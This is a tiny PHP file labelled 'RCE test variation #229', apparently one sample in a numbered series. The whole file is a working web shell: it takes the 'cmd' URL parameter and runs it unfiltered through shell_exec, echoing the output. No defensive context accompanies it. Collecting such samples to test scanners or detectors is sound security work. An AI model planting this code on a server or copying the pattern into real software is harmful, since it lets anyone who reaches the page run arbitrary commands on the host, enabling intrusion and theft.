<?php
// RCE test variation #229
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>